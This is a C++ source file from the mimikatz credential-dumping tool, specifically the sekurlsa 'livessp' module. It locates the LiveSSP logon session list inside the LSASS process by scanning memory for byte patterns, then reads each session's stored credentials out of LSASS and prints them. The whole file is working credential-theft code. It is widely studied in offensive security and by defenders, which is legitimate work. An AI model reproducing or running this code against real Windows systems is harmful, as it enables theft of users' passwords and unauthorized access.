/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "livessp.h"
#include "..\..\global.h"
mod_process::PKIWI_VERY_BASIC_MODULEENTRY mod_mimikatz_sekurlsa_livessp::pModLIVESSP = NULL;
mod_mimikatz_sekurlsa_livessp::PKIWI_LIVESSP_LIST_ENTRY mod_mimikatz_sekurlsa_livessp::LiveGlobalLogonSessionList = NULL;//reinterpret_cast<mod_mimikatz_sekurlsa_livessp::PKIWI_LIVESSP_LIST_ENTRY>(NULL);

bool mod_mimikatz_sekurlsa_livessp::getLiveSSP(vector<wstring> * arguments)
{
	vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>(getLiveSSPLogonData, wstring(L"livessp")));
	return mod_mimikatz_sekurlsa::getLogonData(arguments, &monProvider);
}

bool mod_mimikatz_sekurlsa_livessp::searchLiveGlobalLogonSessionList()
{
#ifdef _M_X64
	BYTE PTRN_WALL_LiveUpdatePasswordForLogonSessions[]	= {0x48, 0x83, 0x65, 0xdf, 0x00, 0x48, 0x83, 0x65, 0xef, 0x00, 0x48, 0x83, 0x65, 0xe7, 0x00};
#elif defined _M_IX86
	BYTE PTRN_WALL_LiveUpdatePasswordForLogonSessions[]	= {0x89, 0x5d, 0xdc, 0x89, 0x5d, 0xe4, 0x89, 0x5d, 0xe0};
#endif
	LONG OFFS_WALL_LiveUpdatePasswordForLogonSessions	= -(5 + 4);

	if(mod_mimikatz_sekurlsa::searchLSASSDatas() && pModLIVESSP && !LiveGlobalLogonSessionList)
	{
	
		PBYTE *pointeur = reinterpret_cast<PBYTE *>(&LiveGlobalLogonSessionList);
		if(HMODULE monModule = LoadLibrary(L"livessp"))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				mod_memory::genericPatternSearch(pointeur, L"livessp", PTRN_WALL_LiveUpdatePasswordForLogonSessions, sizeof(PTRN_WALL_LiveUpdatePasswordForLogonSessions), OFFS_WALL_LiveUpdatePasswordForLogonSessions);
				*pointeur += pModLIVESSP->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}
	}
	return (pModLIVESSP && LiveGlobalLogonSessionList);
}

bool WINAPI mod_mimikatz_sekurlsa_livessp::getLiveSSPLogonData(__in PLUID logId, __in bool justSecurity)
{
	if(searchLiveGlobalLogonSessionList())
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		BYTE * monBuffP = new BYTE[sizeof(KIWI_LIVESSP_LIST_ENTRY)], * monBuffC = new BYTE[sizeof(KIWI_LIVESSP_PRIMARY_CREDENTIAL)];
		if(PKIWI_LIVESSP_LIST_ENTRY pLogSession = reinterpret_cast<PKIWI_LIVESSP_LIST_ENTRY>(mod_mimikatz_sekurlsa::getPtrFromLinkedListByLuid(reinterpret_cast<PLIST_ENTRY>(LiveGlobalLogonSessionList), FIELD_OFFSET(KIWI_LIVESSP_LIST_ENTRY, LocallyUniqueIdentifier), logId)))
		{
			if(mod_memory::readMemory(pLogSession, monBuffP, sizeof(KIWI_LIVESSP_LIST_ENTRY), mod_mimikatz_sekurlsa::hLSASS))
			{
				pLogSession = reinterpret_cast<PKIWI_LIVESSP_LIST_ENTRY>(monBuffP);
				if(pLogSession->suppCreds)
				{
					if(mod_memory::readMemory(pLogSession->suppCreds, monBuffC, sizeof(KIWI_LIVESSP_PRIMARY_CREDENTIAL), mod_mimikatz_sekurlsa::hLSASS))
						mesCreds = &(reinterpret_cast<PKIWI_LIVESSP_PRIMARY_CREDENTIAL>(monBuffC)->credentials);
				}
				else (*outputStream) << L"n.s. (SuppCred KO) / ";
			}
		}
		mod_mimikatz_sekurlsa::genericCredsToStream(mesCreds, justSecurity, true);
		delete [] monBuffC, monBuffP;
	}
	else (*outputStream) << L"n.a. (livessp KO)";
	return true;
}